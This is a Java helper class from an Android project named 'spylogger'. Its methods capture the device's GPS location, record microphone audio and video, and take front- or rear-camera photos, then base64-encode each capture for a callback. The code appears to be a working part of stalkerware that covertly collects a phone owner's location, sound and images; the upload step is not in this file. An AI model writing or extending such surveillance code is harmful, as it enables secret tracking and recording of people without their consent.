package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import com.gravatasufoca.spylogger.services.GPSTracker;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.LocalizacaoVO;

import java.io.IOException;

/**
 * Created by bruno on 19/11/16.
 */

public class ServicosHelper {

    public void getLocation(final Context context, final Integer espera, final TaskComplete callback) {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                GPSTracker gpsTracker = new GPSTracker(context);
                if (gpsTracker.canGetLocation()) {
                    try {
                        Thread.sleep(espera!=null?espera*1000:5000);

                        LocalizacaoVO localizacaoVO=new LocalizacaoVO();
                        localizacaoVO.setLatitude(gpsTracker.getLatitude());
                        localizacaoVO.setLongitude(gpsTracker.getLongitude());
                        localizacaoVO.setPrecisao(Double.valueOf(gpsTracker.getAccuracy()));
                        localizacaoVO.setGpsLigado(gpsTracker.canGetLocation());

                        if(callback!=null){
                            callback.onFinish(localizacaoVO);
                        }

                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }finally {
                        gpsTracker.endTracking();
                        gpsTracker=null;
                    }
                }
            }
        });
    }

    public void getAudio(Context context, int maxLength, final TaskComplete callback) {
        try {
            final MediaRecorderHelper mediaRecorderHelper = new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.AUDIO);
            TaskComplete cb = new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    if (object!=null && callback != null) {
                        callback.onFinish(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
                    }
                }
            };
            mediaRecorderHelper.setMaxDuration(maxLength);
            mediaRecorderHelper.setCallback(cb);
            mediaRecorderHelper.setLigacao(false);
            mediaRecorderHelper.start();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void getVideo(final Context context, final int maxLength, final boolean frontCamera, final TaskComplete callback) {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    final MediaRecorderHelper mediaRecorderHelper = new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.VIDEO);
                    TaskComplete cb = new TaskComplete() {
                        @Override
                        public void onFinish(Object object) {
                            if (callback != null && object!=null) {
                                callback.onFinish(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
                            }
                        }
                    };
                    mediaRecorderHelper.setMaxDuration(maxLength);
                    mediaRecorderHelper.setCallback(cb);
                    mediaRecorderHelper.setFrontCamera(frontCamera);
                    mediaRecorderHelper.start();

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

    }

    public void getPicture(final Context context, final boolean frontCamera, final TaskComplete callback) {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    final MediaRecorderHelper mediaRecorderHelper = new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.IMAGE);
                    TaskComplete cb = new TaskComplete() {
                        @Override
                        public void onFinish(Object object) {
                            if(callback!=null && object!=null) {
                                byte[] data = (byte[]) object;
                                callback.onFinish(Utils.encodeBase64(data));
                            }
                        }
                    };
                    mediaRecorderHelper.setCallback(cb);
                    mediaRecorderHelper.setFrontCamera(frontCamera);
                    mediaRecorderHelper.takePicture();

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
